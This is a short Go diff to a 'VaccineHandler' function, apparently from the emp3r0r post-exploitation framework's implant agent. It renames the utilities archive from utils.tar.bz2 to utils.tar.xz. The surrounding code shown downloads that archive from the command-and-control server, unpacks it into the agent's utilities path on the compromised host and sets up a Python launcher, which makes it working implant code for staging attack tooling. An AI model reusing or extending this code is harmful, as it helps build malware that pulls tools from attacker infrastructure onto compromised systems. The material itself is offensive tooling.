@@ -25,6 +25,7 @@ func VaccineHandler() (out string) {
 	}
 
 	var (
+		UtilsArchive  = "utils.tar.xz"
 		LibPath       = RuntimeConfig.UtilsPath + "/lib"
 		PythonArchive = RuntimeConfig.UtilsPath + "/python3.tar.xz"
 		PythonLib     = RuntimeConfig.UtilsPath + "/python3.11"
@@ -41,17 +42,17 @@ func VaccineHandler() (out string) {
 		PythonLauncher = fmt.Sprintf("#!%s\n%s"+`"$@"`+"\n", emp3r0r_data.DefaultShell, PythonCmd)
 	)
 
-	log.Printf("Downloading utils from %s", emp3r0r_data.CCAddress+"www/utils.tar.bz2")
-	_, err := DownloadViaCC("utils.tar.bz2", RuntimeConfig.AgentRoot+"/utils.tar.bz2")
+	log.Printf("Downloading utils from %s", emp3r0r_data.CCAddress+"www/"+UtilsArchive)
+	_, err := DownloadViaCC(UtilsArchive, RuntimeConfig.AgentRoot+"/"+UtilsArchive)
 	out = "[+] Utils have been successfully installed"
 	if err != nil {
 		log.Print("Utils error: " + err.Error())
 		out = "[-] Download error: " + err.Error()
 		return
 	}
-	defer os.Remove(RuntimeConfig.AgentRoot + "/utils.tar.bz2")
+	defer os.Remove(RuntimeConfig.AgentRoot + "/" + UtilsArchive)
 
-	// unpack utils.tar.bz2 to our PATH
+	// unpack utils.tar.xz to our PATH
 	os.RemoveAll(RuntimeConfig.UtilsPath) // archiver fucking aborts when files already exist
 	if !util.IsExist(RuntimeConfig.UtilsPath) {
 		if err = os.MkdirAll(RuntimeConfig.UtilsPath, 0700); err != nil {
@@ -60,7 +61,7 @@ func VaccineHandler() (out string) {
 		}
 	}
 
-	if err = archiver.Unarchive(RuntimeConfig.AgentRoot+"/utils.tar.bz2",
+	if err = archiver.Unarchive(RuntimeConfig.AgentRoot+"/"+UtilsArchive,
 		RuntimeConfig.UtilsPath); err != nil {
 		log.Printf("Unarchive: %v", err)
 		return fmt.Sprintf("Unarchive: %v", err)
